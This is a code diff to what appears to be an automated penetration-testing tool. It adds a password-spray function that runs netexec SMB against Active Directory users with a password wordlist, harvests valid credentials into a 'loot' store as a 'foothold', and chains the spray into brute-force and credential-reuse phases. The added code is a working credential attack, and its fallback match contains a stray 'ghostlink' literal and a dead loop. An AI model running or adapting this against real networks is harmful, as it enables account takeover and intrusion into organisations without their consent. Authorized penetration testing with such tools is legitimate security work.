@@ -2995,6 +2995,65 @@ def _spray_userequal_pass(target, outdir, args, loot, context, nxc, domain=''):
     return vulns
 
 
+def run_password_spray(target, services, outdir, args, tools, loot=None, context=None):
+    """Horizontal password spray of discovered/enumerated AD users against a
+    password wordlist (--passlist), via netexec SMB. Sprays one password across
+    all users at a time (lockout-aware), stops on first hit, and feeds any valid
+    credential into the reuse loop. Active-gated."""
+    vulns = []
+    if not active_enabled(args):
+        return vulns
+    nxc = _nxc_bin()
+    passlist = getattr(args, 'passlist', None)
+    users_file = outdir / 'ad_users.txt'
+    if not (nxc and passlist and Path(passlist).exists() and users_file.exists()):
+        return vulns
+    users = [u for u in users_file.read_text().splitlines() if u.strip()]
+    passwords = [p for p in Path(passlist).read_text().splitlines() if p.strip()]
+    if not users or not passwords:
+        return vulns
+    domain = (context or {}).get('domain', '') or getattr(args, 'domain', '') or ''
+    subsection(f"Password Spray ({len(users)} users x {len(passwords)} passwords)")
+    dom = ['-d', domain] if domain else ['--local-auth']
+    for pw in passwords:
+        # one password across all users (horizontal spray)
+        _, out, _ = _run([nxc, 'smb', target, '-u', str(users_file), '-p', pw,
+                         '--continue-on-success'] + dom, timeout=120)
+        for m in re.finditer(r'\\([^:\\\s]+):' + re.escape(pw) + r'\s+\[\+\]', out):
+            pass
+        for m in re.finditer(r'\[\+\]\s+\S+\\([^:\s]+):' + re.escape(re.sub(r'\s', '', pw)), out):
+            u = m.group(1)
+            good(f"  SPRAY HIT: {u}:{pw}")
+            if loot:
+                loot.add_cred(u, pw, source='password-spray', scope='smb', verified=True)
+                loot.add_step(f"Foothold: {u}:{pw} via password spray")
+            if context is not None and not context.get('creds'):
+                context['creds'] = f"{u}:{pw}"
+            vulns.append({'port': 445, 'service': 'smb', 'product': 'AD', 'version': '',
+                         'desc': f'Valid credential via password spray: {u}:{pw}', 'cve': '',
+                         'exploit': f'nxc smb {target} -u {u} -p {pw}', 'severity': 'critical'})
+        # also catch generic [+] lines (nxc formats vary by version)
+        if '[+]' in out and not vulns:
+            for line in out.splitlines():
+                if '[+]' in line and 'ghostlink' in line.lower():
+                    m2 = re.search(r'\\([^:\s\\]+):(\S+)', line)
+                    if m2:
+                        good(f"  SPRAY HIT: {line.strip()}")
+                        if loot:
+                            loot.add_cred(m2.group(1), pw, source='password-spray', scope='smb', verified=True)
+                        if context is not None and not context.get('creds'):
+                            context['creds'] = f"{m2.group(1)}:{pw}"
+                        vulns.append({'port': 445, 'service': 'smb', 'product': 'AD', 'version': '',
+                                     'desc': f'Valid credential via password spray: {m2.group(1)}:{pw}',
+                                     'cve': '', 'exploit': f'nxc smb {target} -u {m2.group(1)} -p {pw}',
+                                     'severity': 'critical'})
+        if vulns:
+            break
+    if not vulns:
+        info("  no valid credentials from spray")
+    return vulns
+
+
 def run_credential_attacks(target, services, outdir, args, tools, loot=None, context=None):
     """hydra/medusa credential brute against discovered auth services. Active-gated.
     Consumes ad_users.txt when present; records validated creds into loot.valid_creds
@@ -4198,10 +4257,11 @@ def phase5_tools(target, services, outdir, args, tools, api_key=None, loot=None,
                              or p in [80, 81, 443, 591, 2082, 2087, 2095, 2096, 3000, 3128, 5000,
                                       5001, 7001, 7070, 8000, 8008, 8080, 8081, 8088, 8090, 8099,
                                       8443, 8834, 8888, 9000, 9001, 9080, 9443, 10443])
-                         # exclude RPC-over-HTTP / epmap / WinRM which aren't real web apps
+                         # exclude RPC-over-HTTP / epmap / WinRM / ADWS which aren't real web apps
                          and not any(x in s.get('service', '').lower()
-                                     for x in ['rpc', 'epmap', 'wsman', 'winrm'])
+                                     for x in ['rpc', 'epmap', 'wsman', 'winrm', 'ncacn', 'mc-nmf'])
                          and p not in [593, 5985, 5986, 9389, 47001]
+                         and p < 49152          # skip dynamic/ephemeral RPC ports
                          and 'httpapi' not in s.get('product', '').lower()])
 
     for port in http_ports:
@@ -4818,6 +4878,9 @@ def phase5_tools(target, services, outdir, args, tools, api_key=None, loot=None,
     # 2. Credential brute against auth services (consumes ad_users.txt)
     shellshock_vulns += run_credential_attacks(target, services, outdir, args, tools, loot,
                                                context=p5_context)
+    # 2b. Password spray enumerated users against --passlist (netexec, lockout-aware)
+    shellshock_vulns += run_password_spray(target, services, outdir, args, tools, loot,
+                                           context=p5_context)
     # 3. Credential reuse sweep: try every found cred against every other service
     shellshock_vulns += run_credential_reuse(target, services, outdir, args, tools, loot,
                                              context=p5_context)
